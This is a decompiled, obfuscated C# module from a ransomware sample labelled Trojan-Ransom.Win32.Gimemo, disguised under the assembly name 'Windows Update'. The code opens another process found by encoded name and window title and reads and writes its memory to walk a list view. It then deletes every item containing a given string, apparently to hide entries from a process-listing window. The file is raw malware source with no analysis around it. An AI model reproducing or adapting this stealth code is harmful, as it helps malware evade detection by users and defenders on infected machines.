// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Windows Update, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AD392BA1-9C14-4DFE-974F-DF263E483990
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Gimemo.wxj-0ca921544c9054361bc16e568e27aab3c46187149d7919afc9cfc91c5f59efb7.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class \u0006
{
  private static IntPtr \u0002;

  [DllImport("kernel32", EntryPoint = "OpenProcess", SetLastError = true)]
  public static extern \u0006.\u0005 \u0002(uint _param0, bool _param1, int _param2);

  [DllImport("kernel32", EntryPoint = "ReadProcessMemory", CharSet = CharSet.Unicode, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0002(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    StringBuilder _param2,
    int _param3,
    ref int _param4);

  [DllImport("kernel32", EntryPoint = "ReadProcessMemory", CharSet = CharSet.Ansi, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0003(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    StringBuilder _param2,
    int _param3,
    ref int _param4);

  [DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0002(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    ref \u0006.\u0002 _param2,
    int _param3,
    ref int _param4);

  [DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0002(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    ref \u0006.\u0003 _param2,
    int _param3,
    ref int _param4);

  [DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0002(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    IntPtr _param2,
    int _param3,
    ref int _param4);

  [DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
  public static extern int \u0002(IntPtr _param0, uint _param1, IntPtr _param2, IntPtr _param3);

  [DllImport("user32", EntryPoint = "SendMessageA", SetLastError = true)]
  public static extern IntPtr \u0002(
    IntPtr _param0,
    uint _param1,
    IntPtr _param2,
    IntPtr _param3);

  [DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
  public static extern int \u0002(
    IntPtr _param0,
    uint _param1,
    int _param2,
    StringBuilder _param3);

  [DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
  public static extern int \u0002(IntPtr _param0, uint _param1, int _param2, IntPtr _param3);

  [DllImport("kernel32", EntryPoint = "VirtualAllocEx", SetLastError = true)]
  public static extern IntPtr \u0002(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    int _param2,
    uint _param3,
    uint _param4);

  [DllImport("kernel32", EntryPoint = "VirtualFreeEx", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0002(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    int _param2,
    uint _param3);

  [DllImport("kernel32", EntryPoint = "WriteProcessMemory", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0003(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    ref \u0006.\u0002 _param2,
    int _param3,
    ref int _param4);

  [DllImport("kernel32", EntryPoint = "WriteProcessMemory", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool \u0003(
    \u0006.\u0005 _param0,
    IntPtr _param1,
    ref \u0006.\u0003 _param2,
    int _param3,
    ref int _param4);

  public static bool \u0002(IntPtr _param0, IntPtr _param1)
  {
    \u0006.\u0002 = _param1;
    int num1 = -1;
    bool flag;
    try
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002\u2000.\u0002(-1240717355));
      int index = 0;
      while (index < processesByName.Length)
      {
        Process process = processesByName[index];
        if (Operators.CompareString(process.MainWindowTitle, \u0002\u2000.\u0002(-1240717539), false) == 0)
          num1 = process.Id;
        checked { ++index; }
      }
      if (num1 == -1)
        throw new ArgumentException(\u0002\u2000.\u0002(-1240717401), \u0002\u2000.\u0002(-1240717412));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_22;
    }
    \u0006.\u0005 obj = (\u0006.\u0005) null;
    try
    {
      obj = \u0006.\u0002(56U, false, num1);
      if (obj == null && Marshal.GetLastWin32Error() == 0)
        throw new Win32Exception();
      int num2 = checked (\u0006.\u0002(\u0006.\u0002, 4100U, IntPtr.Zero, IntPtr.Zero) - 1);
      int num3 = 0;
      while (num3 <= num2)
      {
        if (new ListViewItem(\u0006.\u0002(num3, 0, obj)).Text.Contains(\u0008.\u0008))
          \u0006.\u0002(\u0006.\u0002, 4104U, num3, IntPtr.Zero);
        checked { ++num3; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_22;
    }
    finally
    {
      if (obj != null)
      {
        obj.Close();
        obj.Dispose();
      }
    }
    return true;
label_22:
    return flag;
  }

  private static string \u0002(int _param0, int _param1, \u0006.\u0005 _param2)
  {
    \u0006.\u0002 structure = new \u0006.\u0002();
    structure.\u000F = 260;
    structure.\u0002 = 1U;
    structure.\u0003 = _param0;
    structure.\u0005 = _param1;
    StringBuilder stringBuilder1 = new StringBuilder(260);
    IntPtr num1;
    try
    {
      num1 = \u0006.\u0002(_param2, IntPtr.Zero, 260, 4096U, 4U);
      structure.\u000E = num1;
      IntPtr num2;
      try
      {
        num2 = \u0006.\u0002(_param2, IntPtr.Zero, structure.\u0002(), 4096U, 4U);
        \u0006.\u0005 obj1 = _param2;
        IntPtr num3 = num2;
        ref \u0006.\u0002 local1 = ref structure;
        int num4 = structure.\u0002();
        int num5 = 0;
        ref int local2 = ref num5;
        if (!\u0006.\u0003(obj1, num3, ref local1, num4, ref local2))
          throw new Win32Exception();
        \u0006.\u0002(\u0006.\u0002, 4141U, _param0, num2);
        \u0006.\u0005 obj2 = _param2;
        IntPtr num6 = num1;
        StringBuilder stringBuilder2 = stringBuilder1;
        int num7 = 0;
        ref int local3 = ref num7;
        if (!\u0006.\u0003(obj2, num6, stringBuilder2, 260, ref local3))
          throw new Win32Exception();
        \u0006.\u0005 obj3 = _param2;
        IntPtr num8 = num2;
        ref \u0006.\u0002 local4 = ref structure;
        int num9 = Marshal.SizeOf((object) structure);
        int num10 = 0;
        ref int local5 = ref num10;
        if (!\u0006.\u0002(obj3, num8, ref local4, num9, ref local5))
          throw new Win32Exception();
      }
      finally
      {
        if (!num2.Equals((object) IntPtr.Zero) && !\u0006.\u0002(_param2, num2, 0, 32768U))
          throw new Win32Exception();
      }
    }
    finally
    {
      if (!num1.Equals((object) IntPtr.Zero) && !\u0006.\u0002(_param2, num1, 0, 32768U))
        throw new Win32Exception();
    }
    return stringBuilder1.ToString();
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct \u0002
  {
    public uint \u0002;
    public int \u0003;
    public int \u0005;
    public uint \u0008;
    public uint \u0006;
    public IntPtr \u000E;
    public int \u000F;
    public int \u0002\u2000;
    public IntPtr \u0003\u2000;
    public int \u0005\u2000;
    public int \u0008\u2000;
    public int \u0006\u2000;
    public IntPtr \u000E\u2000;
    public IntPtr \u000F\u2000;
    public int \u0002\u2001;

    public int \u0002() => Marshal.SizeOf((object) this);
  }

  public struct \u0003
  {
    public uint \u0002;
    public int \u0003;
    public IntPtr \u0005;
    public IntPtr \u0008;
    public int \u0006;
    public int \u000E;
    public IntPtr \u000F;
    public int \u0002\u2000;
    public int \u0003\u2000;

    public int \u0002() => Marshal.SizeOf((object) this);
  }

  internal sealed class \u0005 : SafeHandleZeroOrMinusOneIsInvalid
  {
    public \u0005()
      : base(true)
    {
    }

    public \u0005(IntPtr _param1)
      : base(true)
    {
      this.SetHandle(_param1);
    }

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool \u0002(IntPtr _param0);

    protected override bool ReleaseHandle() => \u0006.\u0005.\u0002(this.handle);
  }
}
